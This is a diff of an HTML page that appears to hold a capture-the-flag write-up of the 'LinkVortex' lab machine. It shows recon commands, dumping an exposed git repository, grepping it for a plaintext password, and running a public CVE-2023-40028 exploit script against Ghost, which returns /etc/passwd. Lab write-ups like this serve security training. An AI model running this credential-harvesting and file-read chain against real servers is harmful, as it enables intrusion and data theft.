@@ -33,7 +33,7 @@
           </div>
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
-<p><img src="/_resources/f5399dbb73644b0aa62f0a5b119521fd.png" /></p>
+<p><img src=":/f5399dbb73644b0aa62f0a5b119521fd" alt="5b9d3a1cf94cecff23cf402b319d4497.png" /></p>
 <div><pre class="hljs"><code>$whatweb http://linkvortex.htb/
 http://linkvortex.htb/ <span class="hljs-comment">[200 OK]</span> Apache, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Apache]</span>, IP<span class="hljs-comment">[10.129.110.17]</span>, JQuery<span class="hljs-comment">[3.5.1]</span>, MetaGenerator<span class="hljs-comment">[Ghost 5.58]</span>, <span class="hljs-keyword">Open</span>-Graph-Protocol<span class="hljs-comment">[website]</span>, PoweredBy<span class="hljs-comment">[Ghost,a]</span>, Script<span class="hljs-comment">[application/ld+json]</span>, Title<span class="hljs-comment">[BitByBit Hardware]</span>, X-Powered-By<span class="hljs-comment">[Express]</span>, X-UA-Compatible<span class="hljs-comment">[IE=edge]</span></code></pre></div>
 <div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">110.17</span>
@@ -50,9 +50,9 @@ Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</sp
 <div><pre class="hljs"><code><span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains<span class="hljs-selector-class">.txt</span> -u http:<span class="hljs-comment">//linkvortex.htb  --append-domain -t 150</span>
 
 Found: dev<span class="hljs-selector-class">.linkvortex</span><span class="hljs-selector-class">.htb</span> Status: <span class="hljs-number">200</span> <span class="hljs-selector-attr">[Size: 2538]</span></code></pre></div>
-<p><img src="/_resources/5e365bc088804384b4b7d4935b73d35a.png" /></p>
+<p><img src=":/5e365bc088804384b4b7d4935b73d35a" alt="4e4214c802a2c6629912f9601e2a541c.png" /></p>
 <p>Running dir on the dev site finds us git repo.</p>
-<p><img src="/_resources/70d29221bc4841639ee5ed3d2c1d80f1.png" /></p>
+<p><img src=":/70d29221bc4841639ee5ed3d2c1d80f1" alt="c62322c1261dc45fd810c2d1b58da956.png" /></p>
 <p>We can run <code>git-dumper http://dev.linkvortex.htb/ git</code> to copy all of it. To speedrun searching for creds we can run <code>grep -ri "password" .</code></p>
 <p>These two stand out the most:<br />
 ./ghost/core/test/regression/api/admin/authentication.test.js:            const password = ‘OctopiFociPilfer45’;<br />
@@ -60,7 +60,7 @@ Found: dev<span class="hljs-selector-class">.linkvortex</span><span class="hljs-
 <p>Looking then on github we can find some CVE’s for ghost. One of them is <a title="https://github.com/0xyassine/CVE-2023-40028" href="https://github.com/0xyassine/CVE-2023-40028">CVE-2023-40028</a>.</p>
 <p>We can execute after modifing the url to <code>http://linkvortex.htb</code> to get new shell.<br />
 <code>./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></p>
-<p><img src="/_resources/604a50ed90874a5aa2f534e0bcb34daa.png" /></p>
+<p><img src=":/604a50ed90874a5aa2f534e0bcb34daa" alt="769b69a03244bdd244b5f804f5f37ea2.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
 <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
 <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
